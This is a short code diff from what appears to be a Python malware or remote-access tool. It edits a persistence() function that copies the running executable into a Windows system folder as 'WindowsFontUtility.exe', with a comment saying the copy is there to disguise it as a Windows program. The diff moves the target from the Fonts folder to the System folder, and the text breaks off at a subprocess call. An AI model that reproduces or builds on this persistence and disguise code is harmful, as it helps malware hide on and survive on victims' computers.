@@ -42,7 +42,7 @@ def resource_path(relative_path: Union[
 def persistence():
     #Windows
     if os.name == "nt":
-        location = "C:\\Windows\\Fonts" + "\\WindowsFontUtility.exe"  # Disguise as a windows program
+        location = "C:\\Windows\\System" + "\\WindowsFontUtility.exe"  # Disguise as a windows program
         if not os.path.exists(location):
             shutil.copyfile(sys.executable, location)
             subprocess.call(
